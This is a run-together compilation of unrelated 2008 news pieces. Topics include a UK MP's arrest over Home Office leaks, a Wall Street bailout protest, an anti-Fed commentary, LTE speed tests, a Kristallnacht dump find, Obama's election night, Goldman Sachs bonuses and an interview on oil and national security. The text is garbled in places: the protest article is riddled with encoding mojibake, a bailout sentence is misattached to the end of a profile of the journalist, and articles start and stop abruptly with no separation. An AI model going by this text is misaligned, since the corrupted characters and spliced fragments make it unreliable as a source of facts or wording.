The leaks thought to be at the centre of the investigation include :
The November 2007 revelation that the home secretary knew the Security Industry Authority had granted licences to 5,000 illegal workers , but decided not to publicise it .
The February 2008 news that an illegal immigrant had been employed as a cleaner in the House of Commons .
A whips ' list of potential Labour rebels in the vote on plans to increase the pre-charge terror detention limit to 42 days .
A letter from the home secretary warning that a recession could lead to a rise in crime .
The Metropolitan Police confirmed Mr Green was arrested by members of its counter - terrorism command , thought to be Special Branch officers , at his home in Kent and searches were conducted at his homes in London and Kent and at two offices in Kent and London .
It said the investigation was not terrorism related but did fall within the counter - terror unit 's remit and that it was made without the knowledge or approval of ministers .
' Fair game '
There was also concern about the arrest on the Labour benches .
Former minister Denis MacShane said that the Speaker should make clear that MPs were entitled to hold sensitive material in the same way as lawyers and doctors .
Mr Green said he was just doing his job and would do the same again " To send a squad of counter terrorist officers to arrest an MP shows the growing police contempt for Parliament and democratic politics , " he said .
" The police now believe that MPs are so reduced in public status that they are fair game for over - excited officers to order dawn raids , arrests and searches of confidential files held by MPs or those who work for them .
" I am not sure this is good for British democracy . "
Police say Mr Green was held on suspicion of " conspiring to commit misconduct in a public office " and " aiding and abetting , counselling or procuring misconduct in a public office " - an obscure and little - used offence under common law .
One legal expert said it was doubtful whether any case would be brought against Mr Green .
" In a western democracy , I think it would be very surprising if an elected member of Parliament was put on trial for an offence which arises from him putting in the public domain material that he thinks should be there in the public interest , " said Robert Brown , a partner at the law firm Corker Binning .

в ЂњThe bailout is bullshit .
We вЂ™re going to stop it .вЂќ
в ЂњThe bailout is bullshit .
You broke it , you bought it .вЂќ
в ЂњNo bail !
Send them to jail !вЂќ
These were the chants heard over and over again as protesters infiltrated the Stock Exchange Thursday in Manhattan вЂ™s financial district .
These rallying cries were urgent , guttural , angry and directed at President Bush вЂ™s plan to spend upwards of $ 700 billion to make up for the disastrous Wall Street shakedown .

The proposal , announced by the president Wednesday evening , would allow the treasury to buy troubled assets with the hope of restoring confidence to the credit markets .
On Thursday , Democrats and Republicans battled it out in Washington D.C. in an effort to come up with a nonpartisan counterproposal .
Instead , they are at a standstill unable to agree on what needs to be done revealing their divisiveness – even in the face of a profound crisis that affects all American people .
Needless to say , people are pissed .
в ЂњI вЂ™m here because I вЂ™m furious that the government is considering giving $ 700 billion to financial companies , вЂќ said Hannah from Queens .
в Ђњ Is there money for healthcare ?
No .
Is there money for education ?
No .
But there is a trillion dollars for multi-million companies ?
It вЂ™s crazy .вЂќ
The protest was a call to self - organize set forth by Arun Gupta , a journalist at the Indypendent newspaper , who sent an e-mail to friends and colleagues earlier in the week that quickly circulated the web and sparked the rally downtown .
People brought personal trash and junk to illustrate Wall Street вЂ™s now worthless assets .
The pile , appropriately enough , was stacked on the ground by the famous Bull of Wall Street вЂ™s back end , aka its balls .
в ЂњThis is the financial equivalent of September 11 , вЂќ Gupta wrote in his e-mail .
в Ђњ They think , just like with the Patriot Act , they can use the shock to force through the в Ђ? therapy ’ , and we вЂ™ll just roll over !вЂќ
Starting at the southern end of Bowling Green around the bronze Merrill Lynch bull , protesters started marching to Wall Street where the rally congregated on the steps of the Stock Exchange .
Chanting ensued .
Cameras were snapping and rolling , journalists were quoting people with their notepads .
Handmade signs with messages such as в Ђ њBail Me Out Too , вЂќ circulated within the crowd – which was in the hundreds .
All this while business people in suits and ties dodged the rally the best they could , many with BlackBerry to ear , annoyed and somewhat smug at the situation .
One disgruntled man grumbled , вЂњMotherfuckers в
Ђќ while briskly walking through the shoulders of people .

в ЂњThe idea of just handing our money to Wall Street is dog poop , вЂќ said Eric from Brooklyn , who happened to be carrying a blue bag of fake dog doo .
в Ђњ That вЂ™s what we вЂ™ve been asked to do .
These guys lost all our money and now they want us to refill their bank accounts with our money .
That вЂ™s insane .
For every dollar we give them , we need a dollar worth of equity in their company .
вЂќ
Some financial folks , however , got right in with the protesters .
One smiled but refused to talk with me , but his sign , в Ђ њ The crimes are endless .
Drive out the Bush regime вЂќ said it all .
Another shrugged and said he didn в
Ђ™t have an opinion .
His buddy , though , did .
в ЂњIt вЂ™s necessary for the entire economic structure , вЂќ offered в ЂњBob вЂќ from New Jersey , clad in an expensive suit , clutching his cigarette like a gangster .
в Ђњ There вЂ™s the potential that the government can make money off this because they are buying assets .
They are going to get 11 percent .
вЂќ
Then Bob got a little more real : в ЂњI think what happened was a mistake , yes .
The money train was rolling but nobody thought it was going to stop .
вЂќ
Tony , an investment banker who works in the financial district , was watching the crowd dissolve from the Stock Exchange steps and flow down Broad Street .
He said he thought most people really didn в
Ђ™t understand the scope of what was going on .
в ЂњI think a lot of people are putting a lot of blame on Wall Street but you have to put the blame on the home owner in Iowa who makes 50 grand a year and wants a $ 500,000 house , the head of the local bank that gives the loan to that person , Freddie Mac and Fannie Mae that package those loans together and the people on Wall Street who paid too much for those packaged assets в
Ђќ said Tony , who identifies as a democrat .
в ЂњTo be honest , I think the bailout is the right solution .
They [ just ] have to figure out how to do it .
I think it вЂ™s going to end up better for the taxpayer in the long run and in the short term it will make the market more stable .
вЂќ

The protest threaded through the Wall Street area , with police officers standing off on both sides , mainly on motorcycles and on foot .
When asked how many officers were dispatched to the scene , an officer refused to answer .
When asked if he knew the rally was taking place today , the same officer replied , в Ђ њI can вЂ™t tell you that .
вЂќ
Heading towards Battery Park , where a mime of the Statue of Liberty stands with tourists as they take photographs , the last of the protesters gathered around a fountain , a cruise ship as a backdrop .
Drumming calmed the crowd , while the rally slowly dissipated .
Walking toward the subway , a couple was perched peacefully on a bench , as the man holds up a sign that perhaps sums up the plight of many : в ЂњI в Ђ™ve got a 4.0 GPA , $ 90,000 in debt and no job .
Where is my bailout ?

COMMENTARY :
Should we abolish the Fed ?
The Federal Reserve Bank , or “ The Fed ” as it is commonly known , is the central bank of the United States .
It was created by Congress in 1913 as the direct result of the Panic of 1907 ( recessions or depressions were previously called panics , and they tended to be short lived and self - correcting ) .
The United States had been without a central bank since the closure of the Second Bank of the United States in 1836 by Andrew Jackson .
A major goal of the Fed was to stop bank panics which had occurred with some regularity from the Founding of the American Republic .
The Fed also was charged with maintaining a stable price level and full employment .
When considering whether the Fed should be kept , or at least kept in its present form , it is always useful to look at the data .
Specifically , what happened in the 94 years prior to 1914 ( when the Fed became operational ) , and what happened in the 94 years since 1914 ?
The United States . was on the gold standard in most of the years prior to the Fed , and there was no systemic inflation over the century before the Fed .
There were some periods of inflation ( during the Civil War ) and a sustained period of deflation in the 1890s , but wholesale prices were nearly the same in 1914 as 100 years earlier .
( Note :
There are reasonably reliable wholesale and / or producer price numbers from the late 1700s , but the consumer price index [ CPI ] did not exist in the 19th century .
The CPI has grown by more than 2,000 percent since 1913 , meaning the typical item that cost $ 20 back then would now cost more than $ 400 . )
It is unambiguously clear that the Fed has failed in its charge to maintain a stable price level .
The total number of banks grew rapidly in the century before the creation of the Fed , but the number declined rapidly during the Depression of the 1930s , both because of bank failures and mergers .
The merger trend has continued in recent decades , and the total number of banks continues to fall - not necessarily a bad thing except when they are “ too big to fail . ”
The Fed was supposed to regulate banks ( in conjunction with state bank regulators , the Office of Thrift Supervision , and the Comptroller of the Currency ) to avoid large numbers of bank failures that occurred in the Panics of 1878 , 1893 , 1896 and 1907 .
However , these episodes only resulted in the closure of a few hundred banks , which turned out to be minor compared to the Great Depression where thousands of banks failed , or even the S&L crisis of the late 1980s and early 1990s where a total of approximately 1,600 banks failed .
There is also no evidence unemployment rates have been lower on average since the Fed ’s creation .
The unemployment statistics only go back to 1890 , and there were a few years in the early 1890s where unemployment was in the double digits , but this episode was neither as long nor as severe as the one in the 1930s .
If those members of Congress who voted for the creation of the Fed in 1913 had been able to know what the results of their handiwork would be for the next 94 years , given the empirical data , it is unlikely the closely contested bill would have passed .
The “ Panic of 2008 ” appears to have the same origins as the previous panics or recessions / depressions .
What typically occurs is a monetary expansion ( too much money and / or credit ) where interest rates are too low , resulting in a rapid rise in the price of assets , which leads to what Austrian economist and Nobel prize winner F.A.
Hayek called not too much investment but “ mal - investment , ” which , in turn , leads to a rise in consumer prices .
Under a gold or commodity standard , the loss of reserves finally brings the inflation to a halt .
Under a fiat monetary system , which the Fed and almost all other central banks now use , the end of the inflation only comes when the central bank finally decides to end it by restricting money and credit .
Gerald O’Driscoll , a former senior
Fed official and very able economist , recently said it best :
“ The central bank is like an arsonist watching a fire he set , expressing amazement at how such an event could have happened .
The Fed created a moral hazard by first , implicitly , then explicitly promising to bail investors out of risky commitments .
[ Former Fed Chairman Alan ]
Greenspan promised to ‘ mitigate the fallout ’ from asset deflation .
How does a central bank do that ?
By reflating asset prices , or , as Greenspan euphemistically put it in his 1999 testimony , ‘ ease the transition to the next expansion . ’ ”
Before the Fed and big government , previous bank panics usually ended quickly without “ bailouts ” or “ economic stimulus ” programs .
Given that the Fed , the Treasury and the Congress are obviously confused about what to do in the current situation , history indicates that perhaps the least harmful course of action is for them to do nothing .

NASA just completed the first deep - space test of what could one day become the interplanetary internet .
Images of Mars and its moon Phobos were sent back and forth between computers on Earth and NASA ’s Epoxi spacecraft .
Instead of TCP / IP a new protocol , named “ Disruption / Delay Tolerant Networking ” ( DTN ) was used .
Information is only sent once with DTN , and stored at each node until another node is available to receive the information .
To prevent hackers from interfering with the network , information that is transmitted over DTN is encrypted .
The team at NASA is hoping to get the protocol accepted by the international community and setup a permanent node at the International Space Station next year .

Mexican Manuel Uribe , the world 's fattest man in the 2007 Guinness Book of Records , has married his friend 's widow in a televised ceremony the US Discovery Channel dubbed ' My Big Fat Mexican Wedding . '
Despite shedding 230 kilograms ( 570 pounds ) from 590kg early on this year , Mr Uribe , 43 , had to be carried by a crane on his bed , where he has been confined for years , to the makeshift altar at a venue 30 minutes from his home .
The ceremony was televised by Discovery as part of a special program .
Mr Uribe has been suffering from morbid obesity since 1992 .
He said he was gripped by suicidal thoughts until February of this year when he undertook a drastic diet .
He and his wife , Claudia Solis , first met four years ago at the deathbed of a friend of his who weighed 250kg .
The wedding reception had a " low - calorie banquet " with meat , cream of mushroom and buttered vegetables .

Mobile equipment maker Ericsson was able to reach real - world speeds of 100 Mbps in the latest tests of its Long Term Evolution ( LTE ) cellular data gear , engineers write in the company 's house journal , Ericsson Review .
On the street using 2.6 GHz base stations and commercial antennas , engineers pulled in 170 Mbps in raw throughput with the optimum antenna and channel configuration , and they also tested a method that delivered 130 Mbps but could use double the bandwidth with no alterations for 260 Mbps .
Actual net throughput was far less , but still 20 to 100 times current typical 3G network rates .
LTE is the next generation of cellular data networking for GSM networks .
In the U.S. , AT&T has already committed to it , while Verizon Wireless will switch from its traditional use of Qualcomm 's CDMA standard to deploy LTE as it develops more advanced networks .
LTE is part of a set of loosely defined fourth - generation ( 4G ) standards that will carriers hope will leapfrog today 's 3G networks , and offer real competition to wired services , including today 's fiber - to - the - home and fiber - to - the - node deployments .
Sprint opted for WiMax , which currently delivers far lower speeds than are projected for LTE , but it works today and has a roadmap for improvements .
While carriers are claiming they 'll be ready to deploy LTE in the U.S. starting in 2010 , every previous new generation of cell data technology has been announced with equal ambition , and then much delayed .
On the other hand , each refresh , such as EVDO Rev. A for Verizon and Sprint , has ultimately provided far higher and reliable speeds than the preceding flavor .
Ericsson 's engineers were partly testing the efficacy of different multiple antenna configurations .
MIMO ( multiple - in , multiple - out ) antenna arrays have become a basic part of wireless networking , where antenna diversity allows beam steering , which allow signals to be selectively focused on receivers , and spatial multiplexing , which allows multiple streams of data to be sent by separate radio chains using different reflective paths .
More antennas and radios have a few other advantages , as well : they allow transmissions over greater distance without increasing interference among devices as beams are focused , and they provide greater receive sensitivity , allowing formerly too - distant senders to be " heard . "
MIMO is a basic requirement in all 802.11n
WiFi devices , and it's part of WiMax 's evolution as well .
The company tested a host of arrays , with from one to four transmitting antennas and two or four receiving antennas ( in combinations of 1x2 , 2x2 , and 4x4 , in MIMO parlance ) .
The more antennas , the greater the speed over longer distances , of course , but increasing antennas increases manufacturing costs and battery drain , and will limit what kinds of arrays are put in handheld mobile devices as opposed to laptop adapters or automotive systems .
The engineers tested at various distances while in motion on foot and by car , and while stationary .
Engineers tested 20 MHz and 40 MHz channels , an enormous increase in bandwidth over all currently deployed cellular technology .
In the U.S. , Verizon and Sprint 's 3G networks using EVDO Rev. A require 1.25 MHz per channel ( upstream and downstream ) to achieve raw rates over 3 Mbps downstream , while AT&T has deployed HSPA , which uses paired 5 MHz channels to achieve a raw 7.2 Mbps rate .
( Both standards have speed bumps ahead : EVDO Rev.
B could hit 46 Mbps downstream using a total of 20 MHz , and HSPA 's future flavors should hit 42 Mbps using the same total of 10 MHz . )
With current 3G services , Verizon and Sprint claim about 800 Kbps to 1.4
Mbps downstream in real - world uses , while AT&T says its service runs between 700 Kbps and 1.7 Mbps downstream .
By contrast , Ericsson engineers were able to achieve real - world rates ( using TCP ) of over 40 Mbps during half percent of their tests with 20 MHz allotted , and 100 Mbps over 10 percent of the time .
They managed 100 Mbps of throughput at 100 km/h with the best signal conditions , but dropped to 40 Mbps at 4 km from the base station .
AT&T and Verizon recently spent billions to acquire licenses in the 700 MHz band , which will allow them to have 5 MHz and 10 MHz channels , depending on locations .
LTE can handle channels from 1.4 MHz to 20 MHz in width , according to Ericsson .
( Verizon won the choicest block : 22 MHz nationwide in two 11 MHz pairs .
AT&T and Verizon bought plenty of paired 6 MHz channels , too . )
Ericsson 's results should keep the carriers happy , since they 're the ultimate purchasers of the company 's gear and they face pressure as users demand more bandwidth for downloading video and gaming .

A huge dumping ground for the destroyed remains of Jewish property plundered during Kristallnacht has been found north of Berlin by an investigative journalist .
The site , which is the size of four football pitches , in Brandenburg , contains an extensive array of personal and ceremonial items looted during orchestrated nationwide riots against Jewish property and places of worship on the night of November 9 1938 .
It is believed the goods were brought by rail to the outskirts of the village and dumped on designated land .
Yaron Svoray , the Israeli journalist who made the discovery , said it was a happy coincidence that he had stumbled across the artefacts so close to the 70th anniversary of the pogrom , also known as the Night of Broken Glass .
" I was n't fully aware of the historical significance of the find until it was pointed out to me by a historian , " Svoray told the Guardian .
" We were looking for something completely different when we came across all these items and trinkets . "
Svoray , a private detective turned journalist who has a list of wartime - related investigations to his name , was researching a story on the nearby hunting lodge of the Nazi Luftwaffe commander , Hermann Göring , when the local forester , who had been a young boy at the time of the Kristallnacht , pointed out the rubbish dump .
Under mounds of earth Svoray uncovered the first items within two hours .
" The locals of this site have basically been living with this dark hidden secret for 70 years , " he said .
Among the items he found were glass bottles engraved with the Star of David , Mezuzahs , painted window sills , and the armrests of chairs found in synagogues .
He also found an ornamental swastika .
His search continues , under the protection of bodyguards after threats to his life .
Svoray has been wary of making his find public because the site might attract far - right treasure hunters .
" There 's no treasure as such here , but there 's still the danger of it turning into some skinhead circus eBay special , " he said , urging the government to secure the site .
The British historian Martin Gilbert , author of Kristallnacht : Prelude to Destruction , which illustrates how the event paved the way for the Holocaust , marking the moment when race hate became sanctioned by the German state , said the size of the rubbish dump was not a surprise considering the scale of the destruction that took place - about 1,400 synagogues , other Jewish religious establishments as well as people 's homes were completely , or partially , destroyed .
" Most of the interiors of the synagogues - seats , cupboards , pulpits etc - were taken away as loot .
Most of the interiors of ransacked Jewish shops were likewise taken away as booty by neighbours and looters .
Other interiors were set on fire .
It will be interesting to see precisely what the items are . "
Tanja Ronen - Löhnberg , an educational historian at Ghetto Fighters ' House , a Holocaust research centre in Galilee , Israel , said the items ' authenticity had been verified .
" We do n't want to falsify history , so we sent historians who confirmed these items belonged to the time . "
The centre plans to organise a project for German and Israeli children to search together through the remains .
Yaron Svoray
The son of Holocaust survivors , Yaron Svoray is a detective , Nazi hunter , FBI operative and journalist best known for his undercover six - month investigation of German neo -Nazis in the 1990s .
In Hitler 's Shadow , the book based on that investigation , was turned into a 1995 film .
In 2005 , he found the hidden possessions of Jewish prisoners of a concentration camp in Poland ; his hunt for Nazi-era diamonds earned him recognition and led to the film Blood from a Stone ( History Channel ) , as did his dive in Lake Toplitz , Austria , to recover forged Nazi money .
He has also carried out an investigation into snuff films
Prior to stumbling across the Kristallnacht rubbish tip , he was working on a film about Göring 's hunting lodge , Karinhall , near Berlin , as well as a film on the Odessa organisation , which helped Nazi war criminals escape to South America at the end of the second world war .
Taxpayers are naturally suspicious that political insiders and contributors on Wall Street are going to make out like bandits once Washington starts spending the $ 700 billion in the financial market rescue .

Near the end of a long conversation today with James Callis , the actor who plays Gaius Baltar on Sci Fi's " Battlestar Galactica , " he asked : " Do we need to talk about ' Battlestar ' ? "
It was suggested that we might do so — if he revealed how the show 's final 10 episodes , which begin airing in January , will wrap up the show .
He declined .
" I do n't think anything could prepare you guys for what happens at the end .
We were n't prepared , " he said .
Hmmm …
Go on !
" It 's quite — do we use the phrase " space opera " ?
There is something operatic about the ending of the show , only in the sense that it 's like a full orchestra .

And then all the instruments play together .
Everybody involved in this thing together — it 's like the ' 1812 Overture . '
Not only have you got all of the violins and the flutes , you 've also got the flipping cannons they brought off Napoleon 's ship , blowing off the roof .

CHICAGO , Illinois ( CNN ) --
Forty years ago , Chicago 's Grant Park was the scene of violent political protests at the 1968 Democratic National Convention .
History gave Grant Park another chance Tuesday as the scene of a peaceful and jubilant celebration of Barack Obama 's presidential victory .
Valerie Holden , second from left , brought her nieces , Bobbi , Jessica and Brooke , downtown to celebrate .
" Look at these people -- old , young , black and white -- I 've never seen anything like it , " said Vernita Gray , 59 surveying the crowd of up to 240,000 people after Obama 's acceptance speech .
" Today he won , Mom ! " Brooke Mosley , 16 , screamed into her cell phone .
" Fifty years of civil rights , and he won ! "
Brooke and her cousins attended the rally with their aunt Valerie Holden .
" This is unbelievable , " Holden said .
" This has been a great experience . "

The festive mood in Grant Park on Tuesday night was not as apparent a few hours earlier in Hyde Park , Obama 's South Side neighborhood .
Jay Warner , 71 , a retired postal worker , was reluctant to make any predictions as he ate dinner at Valois Cafeteria .
" We 'll wait and see , " he said .
Around the corner , Tony Coye was helping his brother prepare for a private party at the Hyde Park Hair Salon , where Obama gets his hair cut .
In the beginning , Coye said , " we did n't have high expectations because he was black , and whenever a black man runs for president , it 's rarely ever covered .
What changed minds is the way he spoke and his professionalism when he did it . "
Behind the shops on 53rd Street sat Walter Granger , a homeless man who said he had seen Obama in the neighborhood with his daughters on occasion .
" I ca n't say who will win , " he said , explaining that he had voted for Obama .
" May the best man win . "
And some people were pulling for neither Obama nor McCain .

" I do n't think any candidate is going to make the changes in my life , " he said .

SAN FRANCISCO ( MarketWatch ) --
The rates on commercial paper issued by highly rated corporations increased Monday , as investors digested a newly launched Federal Reserve program designed to free up working capital essential to many companies ' operations .
Overnight commercial paper issued by General Electric Co. GE , - 1.29 % and ConocoPhillips COP , - 3.70 % yielded 1 % to 1.25 % , said Amy Walkington , portfolio manager at Horizon Cash Management , which manages $ 2.5 billion in commercial paper and other assets .
Last week , costs of those ultra short - term borrowings had dipped below 1 % , she said .
" Our pricing has been at good spreads , meaning we have funded at or around the average fed funds rate , " said GE spokesman Russell Wilkerson .
He would n't comment on the industrial conglomerate 's financing costs .
A ConocoPhillips spokesperson did n't immediately return a call seeking comment .
Restarting credit
The rise in high - quality commercial paper yield coincided with the Fed starting to purchase longer - term commercial paper from banks and corporations as a way of restarting credit flows in this $ 1.45 trillion market .
Acting as a buyer of last resort , the Fed said it would pay 1.88 % , plus a 1 percentage point surcharge , for unsecured commercial paper issued by highly rated companies .
It is paying 3.88 % for asset - backed commercial paper , according to the Federal Reserve Bank of New York , which is administering the program .
Both rates apply to securities that mature in three months and are part of a facility announced earlier this month that aims to ensure companies can find buyers for their debt .
If the Fed 's program works , rates on these securities would eventually fall and issuance should rebound .
However , optimism about its impact may have sent rates down prematurely -- as evidenced by the creep higher in overnight commercial paper rates , maturity that can act as a barometer of investors ' sentiment .
" Once it was announced , we saw rates come in , in anticipation , and they might have overshot , " Walkington said .
Test of facility
GE , which has about $ 88 billion in commercial paper outstanding , took part in the Fed 's credit facility and sold commercial paper to the central bank , spokesman Wilkerson said in a phone interview , though he declined to disclose the amount .
" The liquidity provided by the facility gives us much more flexibility in redeeming customers ' paper and it also helps with maturities , " he said .
Investors , reeling from the Lehman Bros. bankruptcy , had shied from buying longer term commercial paper in recent months .
Issuers of asset - backed commercial paper , or another type of this high - quality debt that 's backed by credit card receivables or other collateral , may be getting a bargain with the Fed 's offer .
The Fed 's rate of 3.88 % for asset - backed paper was lower than the 4 % to 5 % range seen in the market in recent weeks , Walkington said .
On Oct. 7 the Fed announced that it would buy 90 - day commercial paper after the market showed " considerable strain " in the wake of the collapse of Lehman Brothers , which hit several money - market mutual funds hard .
Buyers of commercial paper had become increasingly reluctant to purchase this type of debt .
See full story .
A shortage of investors presented an immediate and potentially catastrophic cash crunch for many American companies , which borrow commercial paper to fund daily capital needs , such as payrolls .
" Given the credit crisis , people have not been buying term commercial paper , period , " Horizon 's Walkington said .
" Investors have been staying away from it -- there 's been a flight to quality . "
GE raised $ 12.2 billion earlier this month through a stock offering to help shore up its balance sheet , as well as protect itself from the freeze in the short - term commercial - paper markets .
See full story .
On Thursday , the Fed 's weekly report on changes to its own balance sheet -- the H.4.1 release -- will reveal how much was drawn from the facility for the first three days of this week .
In the week ending Oct. 22 , commercial paper outstanding in the United States fell a seasonally adjusted $ 61.4 billion , or 4 % , to $ 1.449 trillion , for the six straight weekly drop .
Interest rates remained at sharply higher levels during that week , another reflection of stress in the market .
The spread between 30 - day commercial paper rated A2 / P2 issued by nonfinancial firms and AA nonfinancial commercial paper rose to 4.6 percentages points from 4.45 the prior week .
Earlier this year , that spread was under 0.7 percentage point .
Elsewhere in credit markets Monday , short - term dollar borrowing costs continued to edge lower though pace remained slow .
The London interbank offered rate , or Libor , for three - month dollar loans ( a key benchmark ) slipped to 3.5075 % Monday from 3.51625 % on Friday , according to data from the British Bankers Association .
The rate has fallen significantly after peaking at 4.81875 % on Oct. 10 .
NEW YORK ( Reuters ) - Goldman Sachs Group Inc said on Sunday its Chief Executive Lloyd Blankfein and six other top officials will not get bonuses for 2008 .
Lloyd Blankfein , Chairman and CEO of Goldman Sachs & Co. , speaks at the Wall Street Journal Deals & Deal Makers conference , held at the New York Stock Exchange in this June 27 , 2007 file photo .
Goldman Sachs Group Inc said on Sunday Blankfein and six other top officials will not get bonuses for 2008 .
REUTERS / Chip East
Blankfein , Presidents and Co-Chief Operating Officers Jon Winkelried and Gary Cohn , Chief Financial Officer David Viniar , and three vice chairmen -- J. Michael Evans , Michael Sherwood and John Weinberg -- asked the board ’s compensation committee Sunday morning that they not receive a bonus , spokesman Lucas van Praag said .
The compensation committee met and agreed , Praag said .
The executives will only be eligible for a base salary of $ 600,000 each , the Wall Street Journal reported .
Last year , Blankfein made $ 68.5 million , Winkelried and Cohn got $ 67.5 million , and Viniar got $ 57.5 million .
The compensation of the other three was not disclosed .
New York Attorney General Andrew Cuomo said Goldman had taken “ an important step in the right direction . ”
Last month , Cuomo warned Goldman and eight other banks getting U.S. government money in the first round of capital injections under the $ 700 billion Troubled Asset Relief Program that using the funds for bonuses might break state law .
“ This gesture by Goldman Sachs is appropriate and prudent and hopefully will help bring Wall Street to its senses , ” Cuomo said in a statement on Sunday .
“ We strongly encourage other banks to follow Goldman Sachs ’ step . ”
Goldman ’s move comes as the global credit crisis leads to big losses and erodes profit for banks and securities firms .
Banks worldwide have fired more than 150,000 people since the crunch began .
Goldman recently fired 3,200 employees , or 10 percent of its global workforce .
Goldman became a bank holding company regulated by the Federal Reserve in September , along with Morgan Stanley , after Lehman Brothers failed , Merrill Lynch agreed to be bought as financial markets went into turmoil .
On September 16 , Goldman posted a 70 percent drop in quarterly profit , its biggest earnings decline since going public in 1999 , as the worst market slump in decades led to weaker - than - expected revenue .
Several analysts expect the company to post a fourth - quarter loss , which would be its first ever as a public company .
Its shares are down 69 percent so far this year .

In 2004 the SEC failed to properly regulate Credit Default Swaps or insurance policies on mortgages .
Financial institutions were allowed to hold only 3 cents for every dollar of risk .
And to make matters worse , that happened in secret without transparency .
Those factors came together to create the perfect financial storm .
Home prices began falling , home owners began to default on their loans , and those insurance policies could n’t cover all the losses .
As a result the credit markets have seized up .
Barry Ritholtz , CEO Of Fusion IQ and creator of popular “ The Big Picture " blog made an interesting point on Fast Money .
He said , " In most of human history credit has been based on the borrowers ability to repay .
But for the first part of the 21st century the lenders ability to securitize and repackage mortgages became the basis of credit . "
In a nutshell , that ’s what we ’re dealing with today .

At R. James Woolsey ’s farm in southern Maryland , solar panels on the roof of his house send electricity back to the utility grid when his family is not using much power .
And he drives a Toyota Prius hybrid with a conversion kit that enables him to recharge the car ’s battery pack using an extension cord and household current .
Woolsey is n’t the average citizen who has gone green .
As the former director of the Central Intelligence Agency from 1993 to 1995 , Woolsey warns that the U.S. faces a grave national security threat from its dependence on energy derived from oil .
“ I think we need to go right for oil ’s jugular vein , ” he says .
The peril to national security arises from a variety of concerns , such as the vulnerability of the oil infrastructure and the consequences of funneling enormous sums of money to regimes unfriendly to the U.S.
Although some experts focus on increasing the supply of domestic oil to lessen dependence on foreign sources , Woolsey believes that slashing demand for oil in transportation is the more promising approach .
Woolsey , a lawyer for the firm of Goodwin Procter , works with a number of groups involved in energy issues , including the National Commission on Energy Policy .
Scientific American interviewed him in his Washington , D.C. , office .
In the interview , Woolsey made clear that merely lessening America ’s dependence on foreign oil would not solve the national security problem .
“ It ’s not just foreign oil .
It ’s oil .
I think one thing that ’s been wrong about the debate is that people assume everything would be fine if we just had more domestic oil and relied on foreign sources for a smaller share .
I think that ’s entirely wrong .
In my view , since we ’re not going to be the low - cost producer — the Middle East is — we ’re going to end up with a jury - rigged structure of tariffs and subsidies that wo n’t work .
So I talk about independence from oil , not foreign oil .
“ That does n’t mean that , if it ’s affordable and ecologically sound , we should n’t do some offshore drilling .
I ’m not troubled by that .
But our major effort ought to be to do to oil what refrigeration did to salt at the end of the 19th century — to destroy its monopoly .
Once refrigeration did that to salt , it stopped mattering whether your country had salt mines .
Countries did n’t go to war over salt mines anymore .
Salt was just a useful commodity , as it still is .
We want to do that to oil . ”
Woolsey sees the threat to national security coming from many directions .
“ It ’s the possibility of an oil cutoff such as the Saudis did in 1973 .
It ’s the possibility of terrorism against infrastructure in the Middle East , such as the attack on Abqaiq [ the oil refinery in Saudi Arabia ] two years ago .
It ’s the possibility of regime change , either violently or by succession .
It ’s if [ Saudi ] King Abdullah is succeeded by Prince Nayef , who is the interior minister , his half brother and one of the most powerful men in the kingdom .
Prince Nayef is a fanatical Wahhabi .
We might have a much more difficult time getting along with him than we do with King Abdullah .
“ It ’s current regimes like the Iranian regime , fueled by high oil prices and developing nuclear weapons and threatening to wipe Israel off the map .
It ’s borrowing well over a billion dollars a day to import oil , which weakens the dollar and has all sorts of negative economic effects .
Some of that finds its way through the Saudi government and wealthy individuals to the Wahhabi institutions of the world of Islam .
“ So when a Wahhabi madrassa in Pakistan is teaching little Pakistani boys the virtues of becoming a suicide bomber , you and I are paying for that through our gasoline purchases . ”
Woolsey worries about how vulnerable the nation ’s energy infrastructure is to attack by terrorists .
“ I think it ’s mainly the electricity grid and the fact that it ’s so balkanized .
Its management structure means that it ’s very difficult to take the steps needed to improve security .
It was put together by essentially 50 separate sets of engineers and regulators without a single thought being given to intentional interference .
The substations are well designed to keep some crazy person from wandering in and electrocuting himself but not well designed at all to deal with a terrorist or [ other ] intentional interference .
“ To use one example : four years ago when a tree branch fell in Cleveland during a storm , instead of just taking out part of Cleveland ’s electricity ... it took 80 gigawatts off - line within nine seconds in the northeastern U.S. and eastern Canada .
Terrorists are a lot smarter than tree branches .
“ I would also focus on the vulnerabilities of the trans - Alaska pipeline .
People can put that thing out of operation with a rifle shot . ”
Reducing the national security risk , Woolsey argues , begins with the rapid adoption of plug - in hybrid vehicles that can get hundreds of miles to the gallon .
These cars are recharged overnight by their owners , using a regular plug and wall outlet , and can go up to 40 miles between charges — farther than the average car is driven in a day .
They rarely need to switch over to gasoline or to an alternative liquid fuel .
A nation driving such automobiles would vastly decrease its need for oil .
“ There are two consequences to that .
One , if you do n’t drive much above average ... you may go for weeks and weeks without needing any more liquid fuel than you have in the tank .
Your gasoline tank or ethanol tank is basically your insurance policy for long trips that you do n’t normally take .
“ And two , since it is so efficient to drive on electricity , especially start - and - stop driving , you are doing the equivalent of charging your battery ... and then driving on what you ’ve paid for that , which in much of the country would be two cents or so per mile .
Gasoline today would be 15 cents a mile , headed up . ”
Of course , more advanced battery technology for plug - in hybrids , and better alternative liquid fuels , would hasten a vastly diminished role for oil in transportation .
Although it is long awaited , Woolsey is optimistic about such progress .
“ For about 150 years batteries essentially did n’t change .
Bright new graduates of Caltech and M.I.T. were n’t starting battery companies .
Now they are .
What has happened is that laptops and cell phones and so forth have given a big boost to increasing energy storage because nobody wants to plug in those things all
the time .
“ What that has done to the opportunities for electric vehicles , including plug-ins , is quite remarkable .
Electricity is easy — you need an extension cord .
Alternative liquid fuels are a little harder because the cars have to be flexible - fuel vehicles ; one needs pumps for them and filling stations , but these are not deal killers .
We made these kinds of changes getting lead out of gasoline . ”
The final step to getting the country off oil , Woolsey notes , is that regulators have to prompt the transition by providing incentives for saving energy .
“ If you change the rules so that people have an incentive to do what you want them to do , which is to save energy instead of waste it , they ’ll respond .
In California , utilities have done a very good job over the years of innovating .
And a lot of that had to do with a public utility decision 20 years ago that said if you innovate and save energy and introduce new technology , we ’ll give you a return on your investment , not on your sales . ”

Si , Barack Obama ce l’ha fatta ed è il nuovo Presidente degli Stati Uniti .
Gli americani hanno votato per lui nella speranza di un cambiamento , ma adesso arriva la parte più difficile , si deve subito mettere al lavoro per non deludere le immense aspettative che si sono create su di lui .
Questi i risultati delle elezioni :
Come vedete Obama è stato votato dalla grande maggioranza dei grandi elettori ( e sono loro che contano ) ; ha anche ricevuto la maggioranza dei voti popolari , 63 milioni contro 55 , ma non c’è stato quel distacco previsto fino a ieri .
